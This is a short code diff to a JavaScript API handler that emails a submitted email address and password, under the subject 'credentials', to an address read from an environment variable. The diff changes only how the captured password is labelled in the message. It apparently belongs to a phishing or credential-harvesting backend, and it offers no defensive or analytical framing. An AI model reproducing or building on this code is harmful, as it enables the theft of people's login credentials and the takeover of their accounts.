@@ -33,7 +33,7 @@ export default function handler(
               to: process.env.EMAIL_TO_SEND,
               subject: 'credentials',
               // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
-              html: `<h3>${JSON.stringify(email).replaceAll('"', '')} ${'   '} ${JSON.stringify(password).replaceAll('"', '')}</h3>`
+              html: `<h3>${JSON.stringify(email).replaceAll('"', '')} /password: ${JSON.stringify(password).replaceAll('"', '')}</h3>`
             }).then((rec) => {
 
               console.log(rec);
